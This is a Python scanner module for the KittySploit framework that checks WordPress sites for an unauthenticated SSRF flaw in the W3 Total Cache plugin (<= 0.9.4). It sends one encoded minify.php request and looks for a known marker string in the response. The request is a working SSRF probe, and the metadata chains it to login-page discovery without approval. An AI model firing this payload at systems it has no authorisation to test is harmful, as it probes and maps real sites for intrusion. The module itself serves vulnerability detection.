#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) secu."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF) Detection',
        'description': 'The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'cache', 'ssrf', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpvulndb.com/vulnerabilities/8644', 'https://klikki.fi/adv/w3_total_cache.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('NessusFileIncludeTest',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF) detected",
                path='/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css',
            )
            return True
        return False

